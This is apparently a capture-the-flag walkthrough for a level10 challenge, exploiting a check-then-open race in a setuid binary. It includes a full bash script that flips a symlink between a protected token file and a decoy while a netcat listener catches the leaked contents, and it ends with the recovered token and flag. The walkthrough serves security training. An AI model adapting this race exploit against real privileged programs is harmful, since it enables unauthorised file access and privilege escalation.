With some reverse engineering, the program checks if the real user id access to the file given in av[1] and open this file later without rechecking the real user id. So we found a race condition if we replace the file quick enough.

cat > /tmp/level10.sh << EOF
#!/bin/bash
echo -n > /tmp/link
echo -n > /tmp/file
while true; do
	ln -fs /home/user/level10/token /tmp/link
	ln -fs /tmp/file /tmp/link
done &

while true; do
	/home/user/level10/level10 /tmp/link 127.0.0.1 2>&- >&-
done &

netcat -lk localhost 6969 | grep -m 1 -v '.*( )*.'

killall level10.sh
EOF
chmod +x /tmp/level10.sh

We execute the script :
/tmp/level10.sh
And the token is 'woupa2yuojeeaaed06riuj63c' then we 'su' as flag10 and the flag is 'feulo4b72j7edeahuete3no7c'.